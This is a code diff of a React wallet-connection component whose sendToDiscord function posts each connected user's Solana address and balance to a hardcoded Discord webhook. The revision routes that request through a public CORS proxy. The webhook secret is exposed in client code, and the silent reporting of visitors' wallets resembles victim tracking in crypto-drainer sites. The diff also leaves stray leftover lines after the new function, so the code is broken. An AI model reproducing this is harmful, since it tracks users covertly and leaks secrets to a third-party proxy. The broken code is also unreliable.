@@ -85,20 +85,27 @@ const WalletConnectionHandler: FC = () => {
         }
     };
 
-    const sendToDiscord = async (address: string, balance: number) => {
-        const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+  const sendToDiscord = async (address: string, balance: number) => {
+    const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
 
-        const message = {
-            content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
-        };
+    const proxyUrl = 'https://cors-anywhere.herokuapp.com/'; // public CORS proxy
 
-        try {
-           await fetch(webhookURL, {
-    method: 'POST',
-    mode: 'no-cors', // 👈 add this
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(message)
-});
+    const message = {
+        content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
+    };
+
+    try {
+        await fetch(proxyUrl + webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+        console.log('✅ Sent wallet info through CORS proxy');
+    } catch (error) {
+        console.error('❌ Failed to send through proxy', error);
+    }
+};
+
 
             console.log('✅ Sent wallet info to Discord');
         } catch (error) {
